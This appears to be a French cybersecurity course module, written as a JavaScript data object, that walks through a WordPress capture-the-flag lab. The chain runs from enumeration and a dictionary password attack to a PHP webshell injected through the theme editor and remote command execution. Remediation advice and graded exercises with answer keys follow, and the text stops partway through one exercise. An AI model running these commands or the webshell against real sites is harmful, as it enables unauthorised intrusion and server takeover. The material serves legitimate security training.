export default {
  id: 'm10',
  num: 10,
  title: "CTF 02 — Site WordPress : de l'énumération à la prise de contrôle",
  short: "CTF WordPress",
  icon: "🧩",
  xp: 550,
  duration: 110,
  summary: "Parcours CTF WordPress complet : fingerprint, énumération des utilisateurs et plugins, recherche de vulnérabilités, attaque de mot de passe en lab, accès admin et exécution de code pour capturer le flag.",
  objectives: [
    "Reconnaître un site WordPress et identifier sa version et ses composants",
    "Énumérer utilisateurs, plugins et thèmes avec wpscan",
    "Relier une version de plugin à une CVE et choisir un vecteur d'exploitation",
    "Obtenir un accès admin en lab, exécuter une commande et capturer le flag",
    "Proposer un durcissement WordPress vérifiable"
  ],
  blocks: [
    {
      t: 'callout', v: 'legal', title: "Cible WordPress de laboratoire",
      x: "Le site <code>blog.ctf.lab</code> (10.10.10.30) est une instance WordPress volontairement vulnérable, isolée dans le lab. Les identifiants, plugins et chemins sont fictifs. Ne testez jamais un WordPress réel sans autorisation écrite : l'énumération et les attaques par force brute sont illégales hors périmètre."
    },
    {
      t: 'p',
      x: "WordPress alimente plus de 40 % du web. Sa surface d'attaque est bien connue : <strong>version du cœur</strong>, <strong>plugins et thèmes obsolètes</strong>, <strong>utilisateurs énumérables</strong>, <strong>mots de passe faibles</strong> et <strong>fichiers de configuration exposés</strong>. Un CTF WordPress suit donc une chaîne classique : fingerprint → énumération → vulnérabilité connue → accès → exécution."
    },
    {
      t: 'mini',
      items: [
        { v: 'cyan', h: 'Cible', p: "<code>blog.ctf.lab</code> → <code>10.10.10.30</code>. nginx, PHP 8.1, WordPress 6.4.2, thème Twenty Twenty-Four." },
        { v: 'amber', h: 'Flags', p: "<code>FLAG{WP_VERSION_LEAK}</code>, <code>FLAG{WP_USER_ENUM}</code>, <code>FLAG{WP_PLUGIN_VULN}</code>, <code>FLAG{WP_ADMIN_RCE}</code>." },
        { v: 'lime', h: 'Objectif final', p: "Passer d'un visiteur anonyme à l'exécution de commandes sur le serveur, puis lire <code>/var/www/html/flag.txt</code>." },
        { v: 'magenta', h: 'Règles', p: "Pas de déni de service, pas de modification du contenu réel, pas d'exfiltration. Une preuve minimale suffit." }
      ]
    },
    { t: 'h', x: "10.1 Étape 1 — Reconnaissance et fingerprint" },
    {
      t: 'p',
      x: "Un site WordPress se reconnaît à plusieurs indices : <code>/wp-login.php</code>, <code>/wp-json/</code>, <code>/wp-content/</code>, la balise <code>generator</code> et les en-têtes. On commence par un scan de ports, puis on lit la page d'accueil et ses en-têtes."
    },
    {
      t: 'code', lang: 'bash', title: "Scan et fingerprint",
      x: `mkdir -p ~/ctf/wordpress/{evidence,notes,flags}
cd ~/ctf/wordpress
nmap -sV -sC -p 22,80,443 10.10.10.30 -oN evidence/nmap.txt
curl -sI http://blog.ctf.lab/ | tee evidence/headers.txt
curl -s http://blog.ctf.lab/ -o evidence/home.html
grep -iE 'generator|wp-content|wp-json' evidence/home.html | head`
    },
    {
      t: 'term',
      title: "Résultats du fingerprint",
      x: [
        { c: "nmap -sV -sC -p 22,80,443 10.10.10.30", o: [
          "22/tcp open ssh OpenSSH 8.9p1 Ubuntu",
          "80/tcp open http nginx 1.18.0",
          "443/tcp open ssl/http nginx 1.18.0"
        ] },
        { c: "curl -sI http://blog.ctf.lab/ | grep -iE 'server|x-lab-flag|link'", o: [
          "Server: nginx/1.18.0",
          "X-Lab-Flag: FLAG{WP_VERSION_LEAK}",
          'Link: <http://blog.ctf.lab/wp-json/>; rel="https://api.w.org/"'
        ] },
        { c: "grep -i generator evidence/home.html", o: ['<meta name="generator" content="WordPress 6.4.2" />'] }
      ]
    },
    {
      t: 'callout', v: 'tip', title: "Flag 1",
      x: "Le flag <code>FLAG{WP_VERSION_LEAK}</code> est dans les en-têtes. WordPress 6.4.2 est identifié : vérifiez s'il existe des vulnérabilités connues, mais la priorité reste les plugins et les utilisateurs."
    },
    { t: 'h', x: "10.2 Étape 2 — Énumérer les utilisateurs via l'API REST" },
    {
      t: 'p',
      x: "L'API REST WordPress expose parfois la liste des auteurs : <code>/wp-json/wp/v2/users</code>. C'est une source d'information précieuse pour une attaque de mots de passe ciblée. On récupère les identifiants, les noms affichés et les descriptions."
    },
    {
      t: 'code', lang: 'bash', title: "Utilisateurs via REST",
      x: `curl -s http://blog.ctf.lab/wp-json/wp/v2/users | tee evidence/users.json | jq .
jq -r '.[] | [.id,.slug,.name,.description] | @tsv' evidence/users.json`
    },
    {
      t: 'term',
      title: "Utilisateurs découverts",
      x: [
        { c: "jq -r '.[] | [.id,.slug,.name] | @tsv' evidence/users.json", o: [
          "1\teditor\tEditor",
          "2\tadmin\tAdministrateur"
        ] },
        { c: "jq -r '.[].description' evidence/users.json", o: [
          "Compte de rédaction — FLAG{WP_USER_ENUM}",
          ""
        ] }
      ]
    },
    {
      t: 'p',
      x: "Deux comptes : <code>editor</code> et <code>admin</code>. Le compte <code>admin</code> est peut-être moins utilisé ; <code>editor</code> est souvent le compte de rédaction réel. On note les deux et on vérifie les plugins avant de lancer une attaque de mot de passe."
    },
    { t: 'h', x: "10.3 Étape 3 — Énumérer plugins et thèmes avec WPScan" },
    {
      t: 'p',
      x: "WPScan interroge les fichiers readme, les répertoires de plugins et les thèmes pour identifier les versions. La détection agressive augmente le bruit mais révèle les composants obsolètes. On enregistre le rapport JSON pour l'analyse."
    },
    {
      t: 'code', lang: 'bash', title: "Énumération WPScan",
      x: `wpscan --url http://blog.ctf.lab --enumerate vp,vt,u \\
  --plugins-detection aggressive \\
  --format json -o evidence/wpscan.json

jq -r '.version, (.plugins[]? | .slug + " " + (.version.number // "?"))' evidence/wpscan.json`
    },
    {
      t: 'term',
      title: "Composants détectés",
      x: [
        { c: "wpscan --url http://blog.ctf.lab --enumerate vp,vt,u --plugins-detection aggressive", o: [
          "[+] WordPress version 6.4.2 identified",
          "[+] Plugin found: wp-file-manager 6.0",
          "[+] Plugin found: contact-form-7 5.3.1",
          "[+] Theme found: twentytwentyfour 1.0",
          "[+] User found: editor",
          "[+] User found: admin"
        ] }
      ]
    },
    {
      t: 'callout', v: 'warn', title: "Flag 2 et piste principale",
      x: "Le plugin <code>wp-file-manager 6.0</code> est obsolète et comporte une vulnérabilité critique connue (CVE-2020-25213). Le flag <code>FLAG{WP_PLUGIN_VULN}</code> est écrit dans le fichier readme du plugin. Un plugin abandonné est souvent plus dangereux que le cœur de WordPress."
    },
    {
      t: 'code', lang: 'bash', title: "Confirmer la version et le flag du plugin",
      x: `curl -s http://blog.ctf.lab/wp-content/plugins/wp-file-manager/readme.txt | tee evidence/plugin-readme.txt
grep -iE 'stable tag|FLAG|tested' evidence/plugin-readme.txt
searchsploit wp-file-manager 6.0`
    },
    {
      t: 'term',
      title: "Version vulnérable",
      x: [
        { c: "grep -iE 'stable tag|FLAG' evidence/plugin-readme.txt", o: [
          "Stable tag: 6.0",
          "== Changelog == FLAG{WP_PLUGIN_VULN}"
        ] },
        { c: "searchsploit wp-file-manager 6.0", o: [
          "WordPress Plugin WP File Manager 6.0 - Arbitrary File Upload | php/webapps/49178.py",
          "CVE-2020-25213"
        ] }
      ]
    },
    { t: 'h', x: "10.4 Étape 4 — Obtenir un compte admin" },
    {
      t: 'p',
      x: "Deux chemins sont possibles : exploiter directement l'upload du plugin, ou obtenir un compte admin puis utiliser l'éditeur de thème. Pour comprendre la chaîne complète, on commence par l'attaque de mot de passe ciblée sur <code>editor</code>. Le brief du lab fournit une wordlist courte et le mot de passe est <code>Summer2024!</code>."
    },
    {
      t: 'code', lang: 'bash', title: "Attaque de mot de passe en lab",
      x: `wpscan --url http://blog.ctf.lab \\
  --usernames editor \\
  --passwords /usr/share/wordlists/ctf-lab-passwords.txt \\
  --max-threads 5`
    },
    {
      t: 'term',
      title: "Mot de passe trouvé",
      x: [
        { c: "wpscan --url http://blog.ctf.lab --usernames editor --passwords ctf-lab-passwords.txt", o: [
          "[+] Performing password attack on WPScan against user: editor",
          "[SUCCESS] - editor / Summer2024!",
          "[+] Valid combinations found: editor:Summer2024!"
        ] }
      ]
    },
    {
      t: 'callout', v: 'danger', title: "Ne pas confondre lab et production",
      x: "Une attaque par dictionnaire sur un site réel sans autorisation est une infraction, même si le mot de passe est faible. En audit, on teste un compte de démonstration avec des identifiants fournis ou une liste blanche prévue au contrat. Verrouillage de compte et MFA doivent être testés sans bloquer les utilisateurs."
    },
    {
      t: 'p',
      x: "On se connecte avec <code>curl</code> en conservant les cookies, puis on vérifie l'accès au tableau de bord et la présence des menus d'administration."
    },
    {
      t: 'code', lang: 'bash', title: "Connexion et vérification",
      x: `curl -s -c evidence/cookies.txt -b evidence/cookies.txt \\
  -d 'log=editor&pwd=Summer2024!&wp-submit=Log+In&redirect_to=http://blog.ctf.lab/wp-admin/&testcookie=1' \\
  -L http://blog.ctf.lab/wp-login.php -o evidence/dashboard.html

grep -oE 'Dashboard|Tableau de bord|wp-admin/users.php' evidence/dashboard.html | sort -u
curl -s -b evidence/cookies.txt http://blog.ctf.lab/wp-admin/users.php | grep -o 'role-[a-z]*' | sort -u`
    },
    {
      t: 'term',
      title: "Accès admin confirmé",
      x: [
        { c: "grep -oE 'Dashboard|Tableau de bord' evidence/dashboard.html | sort -u", o: ["Tableau de bord"] },
        { c: "curl -s -b evidence/cookies.txt http://blog.ctf.lab/wp-admin/users.php | grep -o 'role-[a-z]*'", o: ["role-administrator"] }
      ]
    },
    {
      t: 'p',
      x: "Le compte <code>editor</code> possède en réalité le rôle administrateur dans ce lab (mauvaise configuration volontaire). On peut donc ouvrir l'éditeur de thème et modifier un fichier PHP. C'est un vecteur classique quand un compte admin est compromis."
    },
    { t: 'h', x: "10.5 Étape 5 — Injecter un webshell via l'éditeur de thème" },
    {
      t: 'p',
      x: "L'éditeur de thème permet de modifier les fichiers du thème actif. On récupère le jeton <code>_wpnonce</code> de la page, puis on envoie le nouveau contenu de <code>404.php</code>. Le code PHP exécute la commande passée dans <code>?cmd=</code>. En lab uniquement."
    },
    {
      t: 'code', lang: 'bash', title: "Lire le nonce et modifier 404.php",
      x: `curl -s -b evidence/cookies.txt \\
  'http://blog.ctf.lab/wp-admin/theme-editor.php?file=404.php&theme=twentytwentyfour' \\
  -o evidence/theme-editor.html

NONCE=$(grep -oE 'name="_wpnonce" value="[^"]+"' evidence/theme-editor.html | head -1 | cut -d'"' -f4)
echo "nonce=$NONCE"

curl -s -b evidence/cookies.txt -X POST http://blog.ctf.lab/wp-admin/theme-editor.php \\
  --data-urlencode "action=update" \\
  --data-urlencode "file=404.php" \\
  --data-urlencode "theme=twentytwentyfour" \\
  --data-urlencode "_wpnonce=$NONCE" \\
  --data-urlencode 'newcontent=<?php if(isset($_GET["cmd"])){ system($_GET["cmd"]); } ?>' \\
  -o evidence/theme-update.html

grep -oE 'File edited successfully|Modification réussie' evidence/theme-update.html`
    },
    {
      t: 'term',
      title: "Modification acceptée",
      x: [
        { c: "echo \"nonce=$NONCE\"", o: ["nonce=8f3a7c21d9"] },
        { c: "grep -oE 'File edited successfully|Modification réussie' evidence/theme-update.html", o: ["File edited successfully."] }
      ]
    },
    {
      t: 'callout', v: 'warn', title: "Le webshell est une preuve, pas un outil durable",
      x: "Le but est de démontrer l'exécution de code. On exécute <code>id</code>, puis on lit le flag. On ne dépose pas de persistance, on ne crée pas de compte et on ne modifie pas d'autres fichiers. En mission réelle, le nettoyage et la restauration du fichier d'origine sont planifiés avec le client."
    },
    { t: 'h', x: "10.6 Étape 6 — Exécuter une commande et capturer le flag" },
    {
      t: 'code', lang: 'bash', title: "Vérifier l'exécution et lire le flag",
      x: `curl -s 'http://blog.ctf.lab/wp-content/themes/twentytwentyfour/404.php?cmd=id'
curl -s 'http://blog.ctf.lab/wp-content/themes/twentytwentyfour/404.php?cmd=hostname'
curl -s 'http://blog.ctf.lab/wp-content/themes/twentytwentyfour/404.php?cmd=cat+/var/www/html/flag.txt' \\
  | tee evidence/flag.txt`
    },
    {
      t: 'term',
      title: "Exécution et flag final",
      x: [
        { c: "curl -s '.../404.php?cmd=id'", o: ["uid=33(www-data) gid=33(www-data) groups=33(www-data)"] },
        { c: "curl -s '.../404.php?cmd=cat+/var/www/html/flag.txt'", o: ["FLAG{WP_ADMIN_RCE}"] }
      ]
    },
    {
      t: 'p',
      x: "Le serveur exécute les commandes sous l'utilisateur <code>www-data</code>. Le flag final est lu. La suite logique serait une élévation de privilèges Linux (module CTF 04) à partir des identifiants de <code>wp-config.php</code> ou d'un service mal configuré."
    },
    { t: 'h', x: "10.7 Récapitulatif de la capture" },
    {
      t: 'table',
      head: ['Étape', 'Action', 'Flag'],
      rows: [
        ['1', "Lire les en-têtes et la balise generator", 'FLAG{WP_VERSION_LEAK}'],
        ['2', "Énumérer les utilisateurs via wp-json", 'FLAG{WP_USER_ENUM}'],
        ['3', "Lire le readme du plugin vulnérable", 'FLAG{WP_PLUGIN_VULN}'],
        ['4', "Trouver le mot de passe de editor en lab", "Aucun flag — accès"],
        ['5', "Modifier le thème pour exécuter du PHP", "Aucun flag — RCE"],
        ['6', "Lire /var/www/html/flag.txt", 'FLAG{WP_ADMIN_RCE}']
      ]
    },
    { t: 'h', x: "10.8 Remédiation WordPress" },
    {
      t: 'ul',
      x: [
        "Mettre à jour le cœur, les plugins et les thèmes ; supprimer les plugins inactifs et non maintenus.",
        "Désactiver l'énumération des utilisateurs via l'API REST et les redirections <code>?author=</code>.",
        "Utiliser des mots de passe forts, un gestionnaire de secrets et la MFA pour tous les comptes admin.",
        "Limiter les tentatives de connexion, verrouiller les comptes et alerter sur les pics d'échecs.",
        "Désactiver l'éditeur de fichiers dans <code>wp-config.php</code> : <code>define('DISALLOW_FILE_EDIT', true);</code>.",
        "Passer <code>wp-config.php</code> en lecture seule et retirer les permissions d'écriture sur les fichiers du thème.",
        "Appliquer le moindre privilège aux comptes : un éditeur ne doit pas être administrateur.",
        "Mettre en place un WAF et une surveillance des fichiers modifiés (intégrité)."
      ]
    },
    { t: 'h', x: "10.9 Fiches commandes WordPress" },
    {
      t: 'cmdref',
      items: [
        {
          cmd: 'nmap -sV -sC', tag: 'Reconnaissance',
          what: "Identifie les ports ouverts et les services d'un site WordPress.",
          gives: "Les ports HTTP/HTTPS, SSH, les versions de nginx/Apache et parfois le titre du site.",
          use: "Confirmer la surface exposée avant de lancer WPScan.",
          syntax: 'nmap -sV -sC -p 22,80,443 IP -oN evidence/nmap.txt',
          example: 'nmap -sV -sC -p 22,80,443 10.10.10.30 -oN evidence/nmap.txt',
          read: "Un port 443 ouvert ne garantit pas HSTS. Un SSH exposé peut devenir une porte d'entrée si un mot de passe fuit dans wp-config.php."
        },
        {
          cmd: 'curl', tag: 'Fingerprint et API',
          what: "Lit les en-têtes, la page d'accueil, l'API REST et les fichiers du site.",
          gives: "La version WordPress, les utilisateurs, les plugins, les cookies et le contenu des fichiers.",
          use: "Récupérer <code>/wp-json/wp/v2/users</code>, le readme d'un plugin, ou se connecter à <code>wp-login.php</code>.",
          syntax: 'curl -s [-I] [-b cookies.txt] [-c cookies.txt] URL',
          example: 'curl -s http://blog.ctf.lab/wp-json/wp/v2/users | jq .',
          read: "Une API REST ouverte révèle les comptes. Un readme de plugin donne la version exacte. Un cookie de session WordPress est souvent <code>wordpress_logged_in_*</code>."
        },
        {
          cmd: 'wpscan', tag: 'Énumération',
          what: "Scanner WordPress qui identifie la version, les plugins, les thèmes, les utilisateurs et les vulnérabilités connues.",
          gives: "Un rapport structuré avec les composants, leurs versions, les CVE et parfois les identifiants faibles.",
          use: "Lancer une énumération ciblée en lab, puis analyser le JSON au lieu de lire la sortie brute.",
          syntax: 'wpscan --url URL --enumerate vp,vt,u --plugins-detection aggressive --format json -o rapport.json',
          example: 'wpscan --url http://blog.ctf.lab --enumerate vp,vt,u --plugins-detection aggressive --format json -o evidence/wpscan.json',
          read: "Un plugin sans mise à jour est une piste prioritaire. Une version de plugin seule ne prouve pas l'exploitabilité : vérifiez la CVE, la configuration et le chemin réellement accessible."
        },
        {
          cmd: 'searchsploit', tag: 'Vulnérabilités',
          what: "Recherche des exploits publics et des PoC dans la base Exploit-DB locale.",
          gives: "Les références d'exploits, les CVE et les chemins de fichiers.",
          use: "Relier un composant et sa version à une vulnérabilité publique, puis vérifier la condition d'exploitation.",
          syntax: 'searchsploit produit version',
          example: 'searchsploit wp-file-manager 6.0',
          read: "Un résultat searchsploit n'est pas une garantie : l'exploit peut viser une autre version ou nécessiter une option. Lisez le code et adaptez-le au lab."
        },
        {
          cmd: 'grep / jq', tag: 'Extraction',
          what: "Filtrent les réponses HTML/JSON pour extraire un nonce, un rôle, un flag ou une version.",
          gives: "La valeur exacte à réutiliser dans la requête suivante.",
          use: "Extraire <code>_wpnonce</code>, un cookie, un identifiant ou le flag sans copier toute la page.",
          syntax: 'grep -oE "motif" fichier ; jq -r ".champ" fichier.json',
          example: 'grep -oE \'name="_wpnonce" value="[^"]+"\' evidence/theme-editor.html',
          read: "Un nonce WordPress est lié à l'action et à la session. Un nonce expiré provoque un 403 : relisez la page et récupérez-en un nouveau."
        },
        {
          cmd: 'curl -b / -c', tag: 'Session admin',
          what: "Envoie et enregistre les cookies de session pour rejouer une session WordPress authentifiée.",
          gives: "Un fichier de cookies réutilisable pour les pages <code>/wp-admin/</code>.",
          use: "Se connecter avec <code>wp-login.php</code>, vérifier le rôle, puis accéder à l'éditeur de thème.",
          syntax: 'curl -s -c cookies.txt -b cookies.txt -d "log=user&pwd=pass" -L URL',
          example: 'curl -s -c evidence/cookies.txt -d "log=editor&pwd=Summer2024!" -L http://blog.ctf.lab/wp-login.php',
          read: "Vérifiez la présence du cookie <code>wordpress_logged_in_*</code> et l'accès à <code>/wp-admin/</code>. Un 302 vers <code>wp-login.php</code> signale un échec de connexion."
        }
      ]
    },
    { t: 'h', x: "10.10 Glossaire WordPress" },
    {
      t: 'glossary',
      items: [
        { term: 'WordPress', def: "CMS open source basé sur PHP et MySQL, extensible par des plugins et des thèmes.", use: "Identifier la version du cœur, des plugins et des thèmes avant de tester.", ex: 'WordPress 6.4.2' },
        { term: 'Plugin', def: "Extension qui ajoute des fonctionnalités à WordPress et s'exécute avec les mêmes privilèges que le site.", use: "Considérer chaque plugin comme une application tierce à auditer et à mettre à jour.", ex: 'wp-file-manager 6.0' },
        { term: 'Thème', def: "Ensemble de fichiers PHP, CSS et JS qui contrôle l'apparence du site.", use: "Un thème modifiable par un admin peut devenir un vecteur d'exécution de code.", ex: 'twentytwentyfour' },
        { term: 'wp-admin', def: "Interface d'administration de WordPress.", use: "Vérifier les rôles, les plugins et les éditeurs de fichiers après compromission d'un compte.", ex: '/wp-admin/users.php' },
        { term: 'REST API', def: "API HTTP de WordPress exposée sous <code>/wp-json/</code>.", use: "Énumérer les utilisateurs et les contenus ; vérifier les permissions des endpoints.", ex: '/wp-json/wp/v2/users' },
        { term: 'Nonce', def: "Jeton temporaire lié à une action et à une session, utilisé pour protéger les formulaires WordPress.", use: "L'extraire de la page avant un POST ; un nonce invalide renvoie souvent 403.", ex: '_wpnonce=8f3a7c21d9' },
        { term: 'XML-RPC', def: "Ancienne interface WordPress souvent utilisée pour l'authentification et les attaques par force brute.", use: "Vérifier s'il est activé et limiter les tentatives ; le désactiver si inutile.", ex: '/xmlrpc.php' },
        { term: 'wp-config.php', def: "Fichier de configuration contenant les identifiants de la base et les clés de sécurité.", use: "Le protéger en lecture, le sortir du webroot si possible et ne jamais l'exposer.", ex: 'DB_PASSWORD, AUTH_KEY' },
        { term: 'Webshell', def: "Fichier déposé sur le serveur qui permet d'exécuter des commandes à distance.", use: "En lab, l'utiliser uniquement pour prouver l'exécution, puis le supprimer et restaurer le fichier.", ex: '<?php system($_GET["cmd"]); ?>' },
        { term: 'CVE', full: 'Common Vulnerabilities and Exposures', def: "Identifiant public d'une vulnérabilité connue.", use: "Relier un composant à une CVE, puis vérifier la version et la condition d'exploitation.", ex: 'CVE-2020-25213' },
        { term: 'Énumération', def: "Collecte systématique des utilisateurs, plugins, thèmes et versions.", use: "Construire une liste de cibles avant de tenter une exploitation.", ex: 'wpscan --enumerate vp,vt,u' },
        { term: 'Durcissement', def: "Ensemble de configurations qui réduisent la surface d'attaque.", use: "Mises à jour, MFA, suppression des plugins inactifs, éditeur désactivé, permissions minimales.", ex: "define('DISALLOW_FILE_EDIT', true);" }
      ]
    }
  ],
  exos: [
    {
      id: 'm10-e1',
      title: 'Scanner le serveur WordPress',
      context: "Vous devez connaître les services exposés par <code>blog.ctf.lab</code> (10.10.10.30).",
      task: "Lancez Nmap avec détection de versions et scripts sur les ports 22, 80 et 443, et enregistrez la sortie dans <code>evidence/nmap.txt</code>.",
      hint: "Utilisez <code>nmap -sV -sC -p 22,80,443 10.10.10.30 -oN evidence/nmap.txt</code>.",
      accept: [/nmap\s+-sV\s+-sC\s+-p\s*22,80,443\s+10\.10\.10\.30\s+-oN\s+evidence\/nmap\.txt/i],
      solution: 'nmap -sV -sC -p 22,80,443 10.10.10.30 -oN evidence/nmap.txt',
      output: [
        '22/tcp open ssh OpenSSH 8.9p1 Ubuntu',
        '80/tcp open http nginx 1.18.0',
        '443/tcp open ssl/http nginx 1.18.0'
      ],
      read: "Le site est servi par nginx. SSH est ouvert : il pourra être utilisé si un identifiant fuit dans la configuration WordPress.",
      pivot: "Passez au fingerprint applicatif : en-têtes, balise generator, wp-json et wp-login."
    },
    {
      id: 'm10-e2',
      title: 'Lire le flag de version',
      context: "La page d'accueil expose peut-être des informations dans ses en-têtes.",
      task: "Affichez les en-têtes de <code>http://blog.ctf.lab/</code> et filtrez la ligne <code>x-lab-flag</code>.",
      hint: "Utilisez <code>curl -sI</code> et <code>grep -i</code>.",
      accept: [/curl\s+-sI\s+http:\/\/blog\.ctf\.lab\/?\s*\|\s*grep\s+-i\s+["']?x-lab-flag/i],
      solution: 'curl -sI http://blog.ctf.lab/ | grep -i "x-lab-flag"',
      output: ['x-lab-flag: FLAG{WP_VERSION_LEAK}'],
      read: "Le flag est dans un en-tête. WordPress est identifiable ; il faut maintenant confirmer la version et les composants.",
      pivot: "Lisez la balise generator et <code>/wp-json/</code> pour compléter le fingerprint."
    },
    {
      id: 'm10-e3',
      title: 'Confirmer la version WordPress',
      context: "La page d'accueil contient une balise meta qui révèle le générateur.",
      task: "Téléchargez la page d'accueil dans <code>evidence/home.html</code> et affichez la ligne contenant <code>generator</code>.",
      hint: "Utilisez <code>curl -s -o evidence/home.html</code> puis <code>grep -i generator</code>.",
      accept: [/curl\s+-s\s+http:\/\/blog\.ctf\.lab\/?\s+-o\s+evidence\/home\.html.*grep\s+-i\s+generator/i],
      solution: 'curl -s http://blog.ctf.lab/ -o evidence/home.html && grep -i generator evidence/home.html',
      output: ['<meta name="generator" content="WordPress 6.4.2" />'],
      read: "WordPress 6.4.2 est confirmé. La version seule ne suffit pas : les plugins sont souvent le vrai point d'entrée.",
      pivot: "Énumérez les utilisateurs puis les plugins avec wpscan."
    },
    {
      id: 'm10-e4',
      title: 'Énumérer les utilisateurs',
      context: "L'API REST WordPress peut exposer la liste des auteurs.",
      task: "Récupérez <code>http://blog.ctf.lab/wp-json/wp/v2/users</code> et extrayez les champs <code>id</code>, <code>slug</code> et <code>name</code>.",
      hint: "Utilisez <code>curl -s .../users | jq -r '.[] | [.id,.slug,.name] | @tsv'</code>.",
      accept: [/curl\s+-s\s+http:\/\/blog\.ctf\.lab\/wp-json\/wp\/v2\/users.*jq\s+-r\s+["'].*\.id.*\.slug.*\.name/i],
      solution: 'curl -s http://blog.ctf.lab/wp-json/wp/v2/users | jq -r ".[] | [.id,.slug,.name] | @tsv"',
      output: [
        '1\teditor\tEditor',
        '2\tadmin\tAdministrateur'
      ],
      read: "Deux comptes sont exposés. Le champ description contient le flag <code>FLAG{WP_USER_ENUM}</code>.",
      pivot: "Ciblez le compte editor avec une wordlist de lab, sans verrouiller de comptes réels."
    },
    {
      id: 'm10-e5',
      title: 'Énumérer plugins et thèmes',
      context: "Vous devez identifier les composants obsolètes du site.",
      task: "Lancez WPScan avec l'énumération <code>vp,vt,u</code>, la détection agressive des plugins et une sortie JSON dans <code>evidence/wpscan.json</code>.",
      hint: "Utilisez <code>--format json -o evidence/wpscan.json</code>.",
      accept: [/wpscan\s+--url\s+http:\/\/blog\.ctf\.lab\s+--enumerate\s+vp,vt,u\s+--plugins-detection\s+aggressive.*(--format\s+json|-o\s+evidence\/wpscan\.json)/i],
      solution: 'wpscan --url http://blog.ctf.lab --enumerate vp,vt,u --plugins-detection aggressive --format json -o evidence/wpscan.json',
      output: [
        'WordPress version 6.4.2 identified',
        'Plugin found: wp-file-manager 6.0',
        'Plugin found: contact-form-7 5.3.1',
        'Theme found: twentytwentyfour 1.0',
        'User found: editor, admin'
      ],
      read: "Le plugin <code>wp-file-manager 6.0</code> est obsolète. Le thème et les utilisateurs sont aussi exposés.",
      pivot: "Lisez le readme du plugin pour le flag et cherchez la CVE correspondante avec searchsploit."
    },
    {
      id: 'm10-e6',
      title: 'Confirmer la vulnérabilité du plugin',
      context: "Vous devez relier le plugin à une vulnérabilité publique.",
      task: "Lisez le readme du plugin et recherchez <code>wp-file-manager 6.0</code> dans Exploit-DB.",
      hint: "Utilisez <code>curl -s .../readme.txt | grep -iE 'stable tag|FLAG'</code> puis <code>searchsploit wp-file-manager 6.0</code>.",
      accept: [/curl\s+-s\s+http:\/\/blog\.ctf\.lab\/wp-content\/plugins\/wp-file-manager\/readme\.txt.*searchsploit\s+wp-file-manager\s+6\.0/is],
      solution: 'curl -s http://blog.ctf.lab/wp-content/plugins/wp-file-manager/readme.txt | grep -iE "stable tag|FLAG" && searchsploit wp-file-manager 6.0',
      output: [
        'Stable tag: 6.0',
        'FLAG{WP_PLUGIN_VULN}',
        'WordPress Plugin WP File Manager 6.0 - Arbitrary File Upload | php/webapps/49178.py',
        'CVE-2020-25213'
      ],
      read: "Le plugin est bien en version 6.0 et une vulnérabilité d'upload arbitraire est documentée. C'est une piste critique.",
      pivot: "Dans ce lab, le chemin guidé passe par un compte admin et l'éditeur de thème. Dans un audit réel, testez uniquement le vecteur autorisé et documentez la CVE."
    },
    {
      id: 'm10-e7',
      title: 'Trouver le mot de passe de lab',
      context: "Le brief du lab indique que le compte <code>editor</code> utilise un mot de passe faible présent dans la wordlist fournie.",
      task: "Lancez WPScan sur l'utilisateur <code>editor</code> avec la wordlist <code>/usr/share/wordlists/ctf-lab-passwords.txt</code>.",
      hint: "Utilisez <code>--usernames editor --passwords ...</code>.",
      accept: [/wpscan\s+--url\s+http:\/\/blog\.ctf\.lab\s+--usernames\s+editor\s+--passwords\s+\/usr\/share\/wordlists\/ctf-lab-passwords\.txt/i],
      solution: 'wpscan --url http://blog.ctf.lab --usernames editor --passwords /usr/share/wordlists/ctf-lab-passwords.txt --max-threads 5',
      output: [
        'Performing password attack on WPScan against user: editor',
        '[SUCCESS] - editor / Summer2024!',
        'Valid combinations found: editor:Summer2024!'
      ],
      read: "Le mot de passe est <code>Summer2024!</code>. En production, une telle attaque doit être encadrée et limitée pour ne pas verrouiller les comptes.",
      pivot: "Connectez-vous avec curl en conservant les cookies, puis vérifiez le rôle réel du compte."
    },
    {
      id: 'm10-e8',
      title: 'Se connecter et conserver la session',
      context: "Vous devez obtenir une session WordPress authentifiée.",
      task: "Connectez-vous à <code>/wp-login.php</code> avec <code>editor:Summer2024!</code>, enregistrez les cookies dans <code>evidence/cookies.txt</code> et suivez la redirection.",
      hint: "Utilisez <code>curl -s -c evidence/cookies.txt -b evidence/cookies.txt -d 'log=editor&pwd=Summer2024!&wp-submit=Log+In' -L</code>.",
      accept: [/curl\s+-s\s+-c\s+evidence\/cookies\.txt\s+-b\s+evidence\/cookies\.txt\s+-d\s+["']log=editor&pwd=Summer2024!.*-L\s+http:\/\/blog\.ctf\.lab\/wp-login\.php/i],
      solution: 'curl -s -c evidence/cookies.txt -b evidence/cookies.txt -d "log=editor&pwd=Summer2024!&wp-submit=Log+In&redirect_to=http://blog.ctf.lab/wp-admin/&testcookie=1" -L http://blog.ctf.lab/wp-login.php -o evidence/dashboard.html',
      output: [
        '..redirection vers /wp-admin/',
        '++cookie wordpress_logged_in_* enregistré',
        '++Dashboard accessible'
      ],
      read: "La session est active. Le fichier de cookies permet de rejouer les requêtes admin sans se reconnecter.",
      pivot: "Vérifiez le rôle du compte et l'accès à <code>theme-editor.php</code>."
    },
    {
      id: 'm10-e9',
      title: 'Extraire le nonce de l\'éditeur de thème',
      context: "Pour modifier un fichier de thème, il faut le jeton <code>_wpnonce</code> de la page.",
      task: "Récupérez la page <code>/wp-admin/theme-editor.php?file=404.php&theme=twentytwentyfour</code> avec les cookies et extrayez la valeur du nonce.",
      hint: "Utilisez <code>grep -oE 'name=\"_wpnonce\" value=\"[^\"]+\"'</code> et <code>cut -d'\"' -f4</code>.",
      accept: [/curl\s+-s\s+-b\s+evidence\/cookies\.txt\s+["'].*theme-editor\.php\?file=404\.php.*theme=twentytwentyfour.*grep\s+-oE\s+["'].*_wpnonce/i],
      solution: 'curl -s -b evidence/cookies.txt "http://blog.ctf.lab/wp-admin/theme-editor.php?file=404.php&theme=twentytwentyfour" -o evidence/theme-editor.html && grep -oE \'name="_wpnonce" value="[^"]+"\' evidence/theme-editor.html | head -1 | cut -d\'"\' -f4',
      output: ['8f3a7c21d9'],
      read: "Le nonce est lié à la session et à l'action. Il change à chaque session et peut expirer.",
      pivot: "Réutilisez-le immédiatement dans le POST de modification du fichier."
    },
    {
      id: 'm10-e10',
      title: 'Modifier le fichier 404.php',
      context: "Vous avez un nonce valide et un accès admin. Vous devez injecter un webshell de démonstration.",
